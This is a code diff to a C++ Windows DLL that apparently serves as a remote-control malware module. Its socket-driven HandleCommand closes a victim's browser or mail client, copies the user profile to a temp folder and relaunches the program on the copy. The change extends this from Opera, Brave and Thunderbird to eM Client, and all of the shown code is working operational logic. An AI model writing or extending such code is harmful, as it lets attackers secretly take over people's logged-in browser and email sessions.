@@ -1905,11 +1905,12 @@ static wstring get_app_path(const wstring& appName) {
 
 static wstring get_browser_profile_path(const wstring& browserName) {
     wchar_t szPath[MAX_PATH];
-    if (browserName == L"Opera" || browserName == L"Opera GX") {
+    if (browserName == L"Opera" || browserName == L"Opera GX" || browserName == L"eM Client") {
         if (SHGetFolderPathW(NULL, CSIDL_APPDATA, NULL, 0, szPath) != S_OK) return L"";
         wstring path = szPath;
         if (browserName == L"Opera") path += L"\\Opera Software\\Opera Stable";
-        else path += L"\\Opera Software\\Opera GX Stable";
+        else if (browserName == L"Opera GX") path += L"\\Opera Software\\Opera GX Stable";
+        else if (browserName == L"eM Client") path += L"\\eM Client";
         return path;
     } else {
         if (SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, szPath) != S_OK) return L"";
@@ -2156,7 +2157,8 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                               wRequestedPath == L"Opera" ||
                               wRequestedPath == L"Opera GX" ||
                               wRequestedPath == L"Brave" ||
-                              wRequestedPath == L"Thunderbird");
+                              wRequestedPath == L"Thunderbird" ||
+                              wRequestedPath == L"eM Client");
 
             bool isGecko = (wRequestedPath == L"Firefox" ||
                             wRequestedPath == L"Waterfox" ||
@@ -2178,6 +2180,7 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                     else if (wRequestedPath == L"Opera GX") exeName = L"opera.exe";
                     else if (wRequestedPath == L"Brave") exeName = L"brave.exe";
                     else if (wRequestedPath == L"Thunderbird") exeName = L"thunderbird.exe";
+                    else if (wRequestedPath == L"eM Client") exeName = L"MailClient.exe";
 
                     if (closeReal && !exeName.empty()) {
                         send_status("Mevcut uygulama kapatılıyor...");
@@ -2225,6 +2228,9 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                             } else if (wRequestedPath == L"Thunderbird") {
                                 exePath = L"C:\\Program Files\\Mozilla Thunderbird\\thunderbird.exe";
                                 if (!fs::exists(exePath)) exePath = L"C:\\Program Files (x86)\\Mozilla Thunderbird\\thunderbird.exe";
+                            } else if (wRequestedPath == L"eM Client") {
+                                exePath = L"C:\\Program Files\\eM Client\\MailClient.exe";
+                                if (!fs::exists(exePath)) exePath = L"C:\\Program Files (x86)\\eM Client\\MailClient.exe";
                             }
                         }
                     }
@@ -2319,7 +2325,7 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                         profilePath = tempProfileRoot;
                     }
 
-                    if (!isGecko && !copyProfile && (wRequestedPath == L"Opera" || wRequestedPath == L"Opera GX")) {
+                    if (!isGecko && !copyProfile && (wRequestedPath == L"Opera" || wRequestedPath == L"Opera GX" || wRequestedPath == L"eM Client")) {
                         wchar_t tempPath[MAX_PATH];
                         GetTempPathW(MAX_PATH, tempPath);
                         wstring tempProfileRoot = tempPath;
@@ -2343,6 +2349,11 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
                         }
                         if (!profilePath.empty()) {
                             args += L" -profile \"" + profilePath + L"\"";
+                        }
+                    } else if (wRequestedPath == L"eM Client") {
+                        args = L"";
+                        if (!profilePath.empty()) {
+                            args += L" /dblocation \"" + profilePath + L"\"";
                         }
                     } else if (wRequestedPath == L"Opera" || wRequestedPath == L"Opera GX") {
                         // Special handling for Opera / Opera GX: use custom profiles but do NOT pass --profile-directory parameters.
